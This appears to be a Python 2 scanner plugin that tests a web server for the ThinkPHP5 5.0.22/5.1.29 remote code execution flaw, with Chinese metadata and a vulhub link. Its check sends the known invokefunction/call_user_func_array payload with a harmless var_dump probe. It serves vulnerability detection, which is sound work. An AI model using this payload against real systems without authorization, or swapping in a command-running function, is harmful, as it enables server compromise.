# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞",
        "info": "ThinkPHP5 5.0.22/5.1.29 由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞，可导致服务器直接被入侵控制",
        "level": "高危",
        "type": "代码执行",
        "author": "taro",
        "url": "https://github.com/vulhub/vulhub/blob/master/thinkphp/5-rce/README.zh-cn.md",
        "keyword": "target:thinkphp",
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=test'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'string(4) \"test\"' in res.text:
            info = '存在代码执行漏洞: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
